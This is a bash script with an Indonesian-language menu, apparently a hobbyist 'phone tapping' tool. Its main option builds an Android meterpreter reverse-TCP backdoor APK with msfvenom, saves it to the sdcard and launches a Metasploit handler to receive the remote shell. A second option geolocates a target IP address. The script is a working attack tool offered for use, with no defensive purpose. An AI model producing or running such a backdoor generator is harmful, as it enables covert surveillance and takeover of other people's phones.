#!/bin/bash
#version 1.0
#Mao Ngapain?
#Mao Recode?
#Utamakan Izin Dulu^_^
#variabels
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'

load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
start1(){
             echo $r"	["$y"#"$r"]"$w" silahkan pilih option" $r"["$y"#"$r"]"
             echo""
             sleep 1
             echo $r"["$y"1"$r"]"$w" sadap hp" $y"	["$g"✓"$y"]" $g"connect"
             sleep 1
             echo $r"["$y"2"$r"]"$w" lacak ip" $y"	["$g"✓"$y"]" $g"connect"
             sleep 1
             echo $r"["$y"99"$r"]"$w" exit" $y"	["$r"?"$y"]" $c"exit"
             echo""
             sleep 1
             echo $r"["$y"#"$r"]"$w" masukkan pilihan №"$c
             read -p "input : " nomor
             if [ $nomor = "1" ]; then
                   mulai
            elif [ $nomor = "2" ]; then
                   echo""
                   read -p "masukkan ip target = " ip
                   echo $r"["$y"#"$r"]"$w"mulai mengambil data"
                   curl -s http://ip-api.com/$ip
                   echo $g" Gunakan tools dengan bijak"
            elif [ $nomor = "99" ]; then
                    echo $r"["$y"#"$r"]" $w"terimakasih telah menggunakan tools ini"
                    exit
            else
                   echo $r"["$y"#"$r"]" $r"Kesalahan"
                   mulai
            fi
}

mulai(){
            echo""
            sleep 1
            echo $r"["$y"#"$r"]" $w"Jika belum install metasploit, install dulu"
            sleep 1
            echo $r"["$y"#"$r"]" $w"Ingin Install Metasploit ?"
            read -p "y/n :" pill;
            if [ $pill = "y" ]; then
                    bash exploit
                    clear
                    banner
                    main
            else
            		clear
            		banner
                    main
            fi
}

main(){
            read -p "Masukkan port : " lport
            sleep 1
            read -p "Masukkan ip : " lhost
            sleep 1
            read -p "Masukkan nama backdor.apk : " backdor
            echo""
            sleep 2
            echo $g"=================================="
            sleep 1
            echo $r"	["$y"#"$r"]" $w"Data Backdor" $r"["$y"#"$r"]"
            sleep 1
            echo $r"["$y"#"$r"]"$w" port : $lport"
            sleep 1
            echo $r"["$y"#"$r"]"$w" IP : $lhost"
            sleep 1
            echo $r"["$y"#"$r"]"$w" nama backdor : $backdor"
            sleep 1
            echo $g"=================================="
            echo""
            sleep 2
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> /sdcard/$backdor
            sleep 5
            echo $r"["$y"#"$r"]" $w"Backdor telah tersimpan di sdcard"
            sleep 3
            echo $r"["$y"#"$r"]"$w" Memulai penyadapan"
            clear
            echo $r"["$y"#"$r"]" $w"Loading.."
            sleep 3
            load
            clear
            banner
            echo""
            sleep 2
            echo $r"["$y"#"$r"]" $w"Memulai Metasploit"
            echo""
            sleep 2
            msfconsole -q -x "use exploit/multi/handler;
            set payload android/meterpreter/reverse_tcp;
            set lhost 127.0.0.1;
            set lport $lport;
            run"
}

banner(){
			echo $b"──▒▒▒▒▒▒───"$y"▄████▄"
			echo $b"─▒─▄▒─▄▒──"$y"███▄█▀"
			echo $b"─▒▒▒▒▒▒▒─"$y"▐████──█─█"
			echo $b"─▒▒▒▒▒▒▒──"$y"█████▄"
			echo $b"─▒─▒─▒─▒───"$y"▀████▀" $c"© sixtysix-Team"
			echo""
			echo $c"╭━╮╭━╮"$y"╱╱"$c"╭╮╭╮"$y"╱╱"$c"╭━━━━╮"$y"╱╱╱╱"$c"╭╮"
			echo $c"┃┃╰╯┃┃"$y"╱╱"$c"┃┣╯╰╮"$y"╱"$c"┃╭╮╭╮┃"$y"╱╱╱╱"$c"┃┃"
			echo $c"┃╭╮╭╮┣╮╭┫┣╮╭╋╮╰╯┃┃┣┻━┳━━┫┃╭━━╮"
			echo $c"┃┃┃┃┃┃┃┃┃┃┃┃┣┫"$y"╱╱"$c"┃┃┃╭╮┃╭╮┃┃┃━━┫"
			echo $c"┃┃┃┃┃┃╰╯┃╰┫╰┫┃"$y"╱╱"$c"┃┃┃╰╯┃╰╯┃╰╋━━┃"
			echo $c"╰╯╰╯╰┻━━┻━┻━┻╯"$y"╱╱"$c"╰╯╰━━┻━━┻━┻━━╯" $y"v.2.0"
			echo""
			sleep 1
			echo $g"================================================="
			sleep 1
			echo $y"	••••• "$c"special 1k subscribe "$y"•••••"
			sleep 1
			echo $g"================================================="
			echo""
}
start1
